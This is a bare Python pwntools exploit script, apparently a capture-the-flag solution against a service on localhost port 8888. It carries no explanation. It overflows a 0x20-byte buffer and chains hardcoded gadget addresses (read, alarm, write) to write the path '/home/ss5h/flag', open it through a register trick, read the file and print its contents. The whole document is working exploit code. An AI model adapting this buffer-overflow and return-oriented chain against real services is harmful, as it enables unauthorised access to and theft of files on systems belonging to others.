from pwn import *

r =remote('127.0.0.1',8888)

def recvuntil(recvdata):
    data = ""
    while 1:
        data += r.recv(1)
        if recvdata in data:
            break

    return data

original_eip = p32(0x0804815a)
set_reg = p32(0x0804813a)
alarm = p32(0x0804810d)
read = p32(0x804811d)
write = p32(0x8048135)
data = 0x080491bc
recvuntil("!")
r.send("A" * 0x20 + read + original_eip + p32(0) + p32(data+0x50) + p32(37))
r.send("/home/ss5h/flag\x00")
recvuntil("Good Luck!\n")

sleep(5)
r.send("A" * 0x20 + alarm + set_reg + original_eip +p32(data+ 0x50) +p32(0))
recvuntil("Good Luck!\n")

r.send("A" * 0x20 + read + original_eip + p32(5) + p32(data+0x50) + p32(100))
recvuntil("Good Luck!\n")
r.send("A" * 0x20 + write + original_eip + p32(1) + p32(data+0x50) + p32(37))

r.interactive()
